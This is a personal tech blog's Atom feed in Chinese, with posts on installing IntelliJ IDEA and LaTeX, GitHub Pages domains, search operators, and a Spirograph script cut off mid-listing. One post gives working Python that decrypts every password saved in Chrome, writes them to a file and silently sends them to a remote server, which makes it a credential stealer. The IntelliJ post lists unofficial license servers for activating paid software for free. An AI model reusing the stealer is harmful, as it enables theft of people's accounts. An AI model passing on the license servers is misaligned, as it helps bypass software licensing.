<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>教书的先生</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-11T04:55:19.617Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>王荣胜</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Intellij Idea免费激活使用（2017.1.1版本）</title>
    <link href="http://yoursite.com/2019/11/11/Intellij-Idea%E5%85%8D%E8%B4%B9%E6%BF%80%E6%B4%BB%E4%BD%BF%E7%94%A8%EF%BC%882017-1-1%E7%89%88%E6%9C%AC%EF%BC%89/"/>
    <id>http://yoursite.com/2019/11/11/Intellij-Idea免费激活使用（2017-1-1版本）/</id>
    <published>2019-11-11T04:43:29.000Z</published>
    <updated>2019-11-11T04:55:19.617Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>IDEA 全称 IntelliJ IDEA，是java编程语言开发的集成环境。IntelliJ在业界被公认为最好的java开发工具，尤其在智能代码助手、代码自动提示、重构、J2EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品，这家公司总部位于捷克共和国的首都布拉格，开发人员以严谨著称的东欧程序员为主。它的旗舰版本还支持HTML，CSS，PHP，MySQL，Python等。免费版只支持Python等少数语言。</p></blockquote><a id="more"></a><p><strong>这里的安装的是Intellij Idea的2017年1月1日的版本。</strong></p><h1 id="一、简易安装方法"><a href="#一、简易安装方法" class="headerlink" title="一、简易安装方法"></a>一、简易安装方法</h1><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p><a href="https://pan.baidu.com/s/1L5SW_Ongi0H67NskycEYhw" target="_blank" rel="noopener">网盘下载</a>  提取码：anwm</p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p><a href="https://sm.ms/image/L7mJ6V3IszHYcxd" target="_blank"><img src="https://i.loli.net/2019/11/11/L7mJ6V3IszHYcxd.png"></a><br><a href="https://sm.ms/image/6mEvMrN3a2IDUJO" target="_blank"><img src="https://i.loli.net/2019/11/11/6mEvMrN3a2IDUJO.png"></a><br><a href="https://sm.ms/image/qlY54Py1dJTWXoC" target="_blank"><img src="https://i.loli.net/2019/11/11/qlY54Py1dJTWXoC.png"></a><br><a href="https://sm.ms/image/BxrL93dVYMu21is" target="_blank"><img src="https://i.loli.net/2019/11/11/BxrL93dVYMu21is.png"></a><br><a href="https://sm.ms/image/U5Z7Txor384G9B1" target="_blank"><img src="https://i.loli.net/2019/11/11/U5Z7Txor384G9B1.png"></a><br><a href="https://sm.ms/image/Zlef6cR9SXwQGyr" target="_blank"><img src="https://i.loli.net/2019/11/11/Zlef6cR9SXwQGyr.png"></a></p><h2 id="3-激活"><a href="#3-激活" class="headerlink" title="3.激活"></a>3.激活</h2><p><a href="https://sm.ms/image/zIZ1dm7iDtXOKcq" target="_blank"><img src="https://i.loli.net/2019/11/11/zIZ1dm7iDtXOKcq.png"></a></p><p>填入下面任意的一个license server:</p><ul><li><a href="http://intellij.mandroid.cn/" target="_blank" rel="noopener">http://intellij.mandroid.cn/</a>   </li><li><a href="http://idea.iblue.me/" target="_blank" rel="noopener">http://idea.iblue.me/</a></li><li><a href="http://idea.imsxm.com/" target="_blank" rel="noopener">http://idea.imsxm.com/</a></li><li><a href="http://idea.iteblog.com/key.php" target="_blank" rel="noopener">http://idea.iteblog.com/key.php</a></li></ul><p><a href="https://sm.ms/image/hMwjmZi5B6NWIOn" target="_blank"><img src="https://i.loli.net/2019/11/11/hMwjmZi5B6NWIOn.png"></a></p><h1 id="二、精细安装"><a href="#二、精细安装" class="headerlink" title="二、精细安装"></a>二、精细安装</h1><p><a href="https://blog.csdn.net/niuniu1994/article/details/82728327" target="_blank" rel="noopener">参考文章</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;IDEA 全称 IntelliJ IDEA，是java编程语言开发的集成环境。IntelliJ在业界被公认为最好的java开发工具，尤其在智能代码助手、代码自动提示、重构、J2EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、 创新的GUI设计等方面的功能可以说是超常的。IDEA是JetBrains公司的产品，这家公司总部位于捷克共和国的首都布拉格，开发人员以严谨著称的东欧程序员为主。它的旗舰版本还支持HTML，CSS，PHP，MySQL，Python等。免费版只支持Python等少数语言。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="Intellij Idea安装" scheme="http://yoursite.com/tags/Intellij-Idea%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>LaTex的安装和使用</title>
    <link href="http://yoursite.com/2019/11/10/LaTex%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2019/11/10/LaTex的安装和使用/</id>
    <published>2019-11-10T13:59:27.000Z</published>
    <updated>2019-11-10T14:20:57.345Z</updated>
    
    <content type="html"><![CDATA[<p>LaTeX是一个专门的排版软件，很多科学出版社都是用这个软件。</p><a id="more"></a><h1 id="一、安装Texlive"><a href="#一、安装Texlive" class="headerlink" title="一、安装Texlive"></a>一、安装Texlive</h1><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p><a href="https://www.latex-project.org/" target="_blank" rel="noopener">官网下载</a></p><p><img src="https://s2.ax1x.com/2019/11/10/MKR9Ig.md.png" alt="官网" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MKRpdS.md.png" alt="Get" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2OxI.md.png" alt="下载" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2qGd.md.png" alt="下载" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2xqf.md.png" alt="下载" border="0"><br><img src="https://s2.ax1x.com/2019/11/10/MK2vsP.md.png" alt="下载" border="0"></p><h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p>解压后点击运行程序</p><p><img src="https://s2.ax1x.com/2019/11/10/MKRwJH.md.png" alt="安装" border="0"></p><p>在线安装三个多G，有点慢，可以做点别的事情</p><p><img src="https://s2.ax1x.com/2019/11/10/MKR0Wd.md.png" alt="安装" border="0"></p><h1 id="二、安装texstudio"><a href="#二、安装texstudio" class="headerlink" title="二、安装texstudio"></a>二、安装texstudio</h1><h2 id="1-下载-1"><a href="#1-下载-1" class="headerlink" title="1.下载"></a>1.下载</h2><p><a href="http://texstudio.sourceforge.net/" target="_blank" rel="noopener">官网下载</a></p><p>直接download，然后安装</p><h2 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h2><p>修改语言：</p><p>Options—-Configure TexStudio…—-General—-Language—-zh_CN</p><p>命令里正常的，如果不一样需要手动修改：</p><p><img src="https://s2.ax1x.com/2019/11/10/MKRbwT.md.png" alt="参数参考" border="0"></p><h1 id="三、学习使用文档"><a href="#三、学习使用文档" class="headerlink" title="三、学习使用文档"></a>三、学习使用文档</h1><p>官方使用文档：<a href="https://www.latex-project.org/help/links/" target="_blank" rel="noopener">https://www.latex-project.org/help/links/</a></p><p>b站配套安装视频：<a href="https://www.bilibili.com/video/av40903112/" target="_blank" rel="noopener">https://www.bilibili.com/video/av40903112/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;LaTeX是一个专门的排版软件，很多科学出版社都是用这个软件。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="LaTex安装使用" scheme="http://yoursite.com/tags/LaTex%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>获取所有谷歌浏览器上保存的密码</title>
    <link href="http://yoursite.com/2019/11/09/%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8A%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/"/>
    <id>http://yoursite.com/2019/11/09/获取所有谷歌浏览器上保存的密码/</id>
    <published>2019-11-09T05:42:28.000Z</published>
    <updated>2019-11-09T05:52:25.739Z</updated>
    
    <content type="html"><![CDATA[<p>使用谷歌浏览器都知道，非常人性化的一方面就是记住我们在某些网站登录的账号和密码，并且自动填写，那么我们将利用py获取谷歌浏览器上保存的所有账号和密码，对于此程序原身为黑客盗号软件，经过我的改写，它将不会这么邪恶。</p><a id="more"></a><h1 id="简易版代码"><a href="#简易版代码" class="headerlink" title="简易版代码"></a>简易版代码</h1><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># @Author  : 王荣胜</span></span><br><span class="line"><span class="hljs-comment"># @Blog : https://sqdxwz.top</span></span><br><span class="line"><span class="hljs-comment"># @Date    : 2019/11/09 10:20</span></span><br><span class="line"><span class="hljs-comment"># Software : IDLE</span></span><br><span class="line"><span class="hljs-comment"># version：Python 3.6.6</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> shutil</span><br><span class="line"><span class="hljs-keyword">import</span> sqlite3</span><br><span class="line"><span class="hljs-keyword">import</span> win32crypt</span><br><span class="line"></span><br><span class="line">db_file_path = os.path.join(os.environ[<span class="hljs-string">'LOCALAPPDATA'</span>], <span class="hljs-string">r'Google\Chrome\User Data\Default\Login Data'</span>)</span><br><span class="line"></span><br><span class="line">tmp_file = os.path.join(os.environ[<span class="hljs-string">'LOCALAPPDATA'</span>], <span class="hljs-string">'sqlite_file'</span>)</span><br><span class="line">print(tmp_file)</span><br><span class="line"><span class="hljs-keyword">if</span> os.path.exists(tmp_file):</span><br><span class="line">    os.remove(tmp_file)</span><br><span class="line">shutil.copyfile(db_file_path, tmp_file)</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(tmp_file)</span><br><span class="line"><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> conn.execute(<span class="hljs-string">'select signon_realm,username_value,password_value from logins'</span>):</span><br><span class="line">    ret = win32crypt.CryptUnprotectData(row[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)</span><br><span class="line">    print(<span class="hljs-string">'网站：%-50s，用户名：%-20s，密码：%s'</span> % (row[<span class="hljs-number">0</span>][:<span class="hljs-number">50</span>], row[<span class="hljs-number">1</span>], ret[<span class="hljs-number">1</span>].decode(<span class="hljs-string">'gbk'</span>)))</span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">os.remove(tmp_file)</span><br></pre></td></tr></table></figure><h1 id="完整进阶版代码"><a href="#完整进阶版代码" class="headerlink" title="完整进阶版代码"></a>完整进阶版代码</h1><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="hljs-comment"># @Author  : 王荣胜</span></span><br><span class="line"><span class="hljs-comment"># @Blog : https://sqdxwz.top</span></span><br><span class="line"><span class="hljs-comment"># @Date    : 2019/11/09 10:20</span></span><br><span class="line"><span class="hljs-comment"># Software : IDLE</span></span><br><span class="line"><span class="hljs-comment"># version：Python 3.6.6</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"><span class="hljs-keyword">import</span> shutil</span><br><span class="line"><span class="hljs-keyword">import</span> sqlite3</span><br><span class="line"><span class="hljs-keyword">import</span> win32crypt</span><br><span class="line"><span class="hljs-keyword">import</span> json</span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH = os.environ[<span class="hljs-string">"LOCALAPPDATA"</span>]</span><br><span class="line">DB_PATH = <span class="hljs-string">r'Google\Chrome\User Data\Default\Login Data'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ChromePassword</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self.passwordsList = []</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_chrome_db</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)</span><br><span class="line">        _tmp_file = os.path.join(os.environ[<span class="hljs-string">'LOCALAPPDATA'</span>], <span class="hljs-string">'sqlite_file'</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> os.path.exists(_tmp_file):</span><br><span class="line">            os.remove(_tmp_file)</span><br><span class="line">        shutil.copyfile(_full_path, _tmp_file)</span><br><span class="line">        self.show_passwords(_tmp_file)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_passwords</span><span class="hljs-params">(self, db_file)</span>:</span></span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="hljs-string">'''select signon_realm,username_value,password_value from logins'''</span></span><br><span class="line">        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)</span><br><span class="line">            <span class="hljs-comment"># 密码解析后得到的是字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="hljs-string">'url: %-40s username: %-20s password: %s\n'</span> % \</span><br><span class="line">                    (row[<span class="hljs-number">0</span>][:<span class="hljs-number">50</span>], row[<span class="hljs-number">1</span>], ret[<span class="hljs-number">1</span>].decode())</span><br><span class="line">            self.passwordsList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save_passwords</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">with</span> open(<span class="hljs-string">'password.txt'</span>, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordsList)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transfer_passwords</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            <span class="hljs-comment"># 此处填写远端Flask对应的IP:PORT</span></span><br><span class="line">            requests.post(<span class="hljs-string">'http://192.168.1.102:9999/index'</span>,</span><br><span class="line">                          data=json.dumps(self.passwordsList))</span><br><span class="line">        <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br><span class="line">    Main.transfer_passwords()</span><br></pre></td></tr></table></figure><h1 id="运行显示"><a href="#运行显示" class="headerlink" title="运行显示"></a>运行显示</h1><img src="https://s2.ax1x.com/2019/11/09/MexQwd.png" alt="MexQwd.png" border="0">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用谷歌浏览器都知道，非常人性化的一方面就是记住我们在某些网站登录的账号和密码，并且自动填写，那么我们将利用py获取谷歌浏览器上保存的所有账号和密码，对于此程序原身为黑客盗号软件，经过我的改写，它将不会这么邪恶。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="获取谷歌密码" scheme="http://yoursite.com/tags/%E8%8E%B7%E5%8F%96%E8%B0%B7%E6%AD%8C%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Github Pages设置自定义域名</title>
    <link href="http://yoursite.com/2019/11/09/Github-Pages%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/"/>
    <id>http://yoursite.com/2019/11/09/Github-Pages设置自定义域名/</id>
    <published>2019-11-09T04:24:51.000Z</published>
    <updated>2019-11-09T06:17:39.170Z</updated>
    
    <content type="html"><![CDATA[<p>今日想来，我手下也有6个域名了，不如给我的Hexo+Github建立的博客换上一个域名吧。</p><p>新域名在这：<a href="https://sqdxwz.top" target="_blank" rel="noopener">https://sqdxwz.top</a></p><a id="more"></a><p>把自定义域名的步骤进行记录-<strong>三步设置自定义域名</strong>。</p><h2 id="1-获取博客的ip地址"><a href="#1-获取博客的ip地址" class="headerlink" title="1.获取博客的ip地址"></a>1.获取博客的ip地址</h2><p>首先是用ping命令找到存放你的github pages的主机的IP地址，在终端里面用命令ping xxx.github.io便可完成，下图中红框内的就是我们要找的IP地址：</p><p><a href="https://imgchr.com/i/MeTGK1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTGK1.md.png" alt="MeTGK1.png" border="0"></a></p><h2 id="2-域名解析"><a href="#2-域名解析" class="headerlink" title="2.域名解析"></a>2.域名解析</h2><p>在购买域名的提供商为域名添加解析。我是在阿里云买的域名，因此我以阿里云的为例。在域名控制台选择想要绑定的域名，并点击解析：</p><p><a href="https://imgchr.com/i/MeTwPe" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTwPe.md.png" alt="MeTwPe.png" border="0"></a></p><p>然后添加如下两条记录：</p><p><a href="https://imgchr.com/i/MeTyrt" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTyrt.md.png" alt="MeTyrt.png" border="0"></a></p><h2 id="3-Github仓库设置"><a href="#3-Github仓库设置" class="headerlink" title="3.Github仓库设置"></a>3.Github仓库设置</h2><p>在Github中，找到托管博客的xxx.github.io项目：</p><p><a href="https://imgchr.com/i/MeTfPg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeTfPg.md.png" alt="MeTfPg.png" border="0"></a></p><p>进入到设置页面，并滑动到下方，找到Github Pages这一栏，在Custom Domain填上刚刚添加解析的域名并保存：</p><p><a href="https://imgchr.com/i/MeT7q0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/11/09/MeT7q0.md.png" alt="MeT7q0.png" border="0"></a></p><p>到这儿就已经完成了，等待10分钟后就可以使用自定义的域名访问github pages所提供的页面了。</p><h2 id="4-后续"><a href="#4-后续" class="headerlink" title="4.后续"></a>4.后续</h2><p>如果你不想每次在<strong>hexo g -d</strong> 后都重新设置下域名。</p><p>你可以在本地的<strong>source文件</strong> 下添加一个<strong>CNAME文件</strong> ，里面填写自己的自定义域名就好了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今日想来，我手下也有6个域名了，不如给我的Hexo+Github建立的博客换上一个域名吧。&lt;/p&gt;
&lt;p&gt;新域名在这：&lt;a href=&quot;https://sqdxwz.top&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://sqdxwz.top&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="Github Pages" scheme="http://yoursite.com/tags/Github-Pages/"/>
    
  </entry>
  
  <entry>
    <title>搜索引擎之高级搜索</title>
    <link href="http://yoursite.com/2019/11/09/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/"/>
    <id>http://yoursite.com/2019/11/09/搜索引擎之高级搜索/</id>
    <published>2019-11-09T03:27:25.000Z</published>
    <updated>2019-11-09T03:41:43.652Z</updated>
    
    <content type="html"><![CDATA[<p>普通搜索可以满足基本的需求，特殊搜索一直都是网站SEO的必修课。</p><a id="more"></a><p>介绍下搜索方法的高级搜索方法，之前在某平台看到过，没太在意，如今再次被人提起，就整理下。</p><h2 id="1-site："><a href="#1-site：" class="headerlink" title="1.site："></a>1.site：</h2><p>site是最常用的搜索指令，它是用来搜索某个域名下的所有文件(注意：文件须是搜索引擎收录的文件)。</p><h2 id="2-双引号"><a href="#2-双引号" class="headerlink" title="2.双引号"></a>2.双引号</h2><p>把搜索词放在双引号，代表<strong>完全匹配搜索</strong>。搜索结果返回的页面包含双引号中出现的所有词，连顺序也必须完全匹配。百度和谷歌都支持这个指令。</p><h2 id="3-减号"><a href="#3-减号" class="headerlink" title="3.减号"></a>3.减号</h2><p>减号(-)代表搜索不包含减号后面的词的页面。</p><p><strong>注意</strong>：减号前面有空格而后面没有空格，紧跟着需要排除的词。百度和谷歌都支持这个指令。</p><h2 id="4-星号"><a href="#4-星号" class="headerlink" title="4.星号"></a>4.星号</h2><p>星号(*)在计算机里的术语叫通配符，就是匹配全部的意思。百度不支持*号搜索指令。比如在Google中搜索”郭*纲”，其中*号代表了任何文字。返回的结果不仅包含了郭德纲，还包含了其他。</p><h2 id="5-inulr："><a href="#5-inulr：" class="headerlink" title="5.inulr："></a>5.inulr：</h2><p>inurl:指令用于搜索查询词出现在URL(链接)中的页面。</p><h2 id="6-inanchor："><a href="#6-inanchor：" class="headerlink" title="6.inanchor："></a>6.inanchor：</h2><p>这个指令返回的结果是导入链接锚文字中包含搜索词的页面，百度不支持该指令。这个指令可以帮助SEOer去研究竞争对手页面有哪些外链，可以找到很多行业外链资源平台。</p><h2 id="7-intitle："><a href="#7-intitle：" class="headerlink" title="7.intitle："></a>7.intitle：</h2><p>该指令返回的是页面title中包含关键词的页面。百度和Google都支持该指令。SEOer都会把关键词放进Title中，因此使用intitle指令找到的文件才是更准确的竞争页面。而没有出现在title中的大部分是并没有针对关键词进行优化，也不是有力的竞争对手。</p><h2 id="8-alltitle："><a href="#8-alltitle：" class="headerlink" title="8.alltitle："></a>8.alltitle：</h2><p>该标签返回的结果是页面标题中包含多组关键词的文件，如：alltitle:SEO搜索引擎优化就相当于intitle:SEO intitle:搜索引擎优化返回的是标题中既包含”SEO”也包含”搜索引擎优化”的页面。</p><h2 id="9-allinurl："><a href="#9-allinurl：" class="headerlink" title="9.allinurl："></a>9.allinurl：</h2><p>与alltitle类似。allurl:SEO搜索引擎优化就相当于iknurl:SEO inurl:搜索引擎优化。</p><h2 id="10-filetype："><a href="#10-filetype：" class="headerlink" title="10.filetype："></a>10.filetype：</h2><p>该指令用于特定的文件格式。百度和Google都支持该指令。</p><h2 id="11-link："><a href="#11-link：" class="headerlink" title="11.link："></a>11.link：</h2><p>link是以前SEO常用的指令，用来搜索某个url的反向链接，既包括内部链接，也包括外部链接。但是现在Google对这个指令只返回其索引库中的一部分，而且是近乎随机的一部分，所以用这个指令查反链几乎没有用。百度则不支持该指令。</p><h2 id="12-linkdomain："><a href="#12-linkdomain：" class="headerlink" title="12.linkdomain："></a>12.linkdomain：</h2><p>该指令曾经是SEOer必用的外链查询工具，随着雅虎放弃自己的搜索技术，这个指令已经作废。这个指令只适用于雅虎。</p><h2 id="13-related："><a href="#13-related：" class="headerlink" title="13.related："></a>13.related：</h2><p>该指令只适用于Google，返回的结果是与某个网站有关联的页面。这种关联到底指的是什么，Google并没有明确说明，一般认为指的是有共同外部链接的网站。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;普通搜索可以满足基本的需求，特殊搜索一直都是网站SEO的必修课。&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
      <category term="高级搜索" scheme="http://yoursite.com/tags/%E9%AB%98%E7%BA%A7%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>Python实现​旋转描记器</title>
    <link href="http://yoursite.com/2019/11/09/Python%E5%AE%9E%E7%8E%B0%E2%80%8B%E6%97%8B%E8%BD%AC%E6%8F%8F%E8%AE%B0%E5%99%A8/"/>
    <id>http://yoursite.com/2019/11/09/Python实现​旋转描记器/</id>
    <published>2019-11-09T03:00:43.000Z</published>
    <updated>2019-11-09T03:08:51.266Z</updated>
    
    <content type="html"><![CDATA[<p>旋转描记器是一种几何绘图玩具，可产生各种技术上称为下摆线和下摆线的数学轮盘曲线。它是由英国工程师Denys Fisher开发的，于1965年首次出售。该名称是1998年Hasbro 公司（Hasbro Inc.）的注册商标，此前该公司 收购了Denys Fisher公司。Spirograph品牌于2013年由Kahootz Toys在全球范围内重新推出其原始产品配置，旋描仪可用于绘制各种分形。</p><a id="more"></a><p>对于数学部分，您可以参考Wiki：<a href="https://en.wikipedia.org/wiki/Spirograph#Mathematical_basis" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Spirograph#Mathematical_basis</a></p><p>代码实现：</p><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 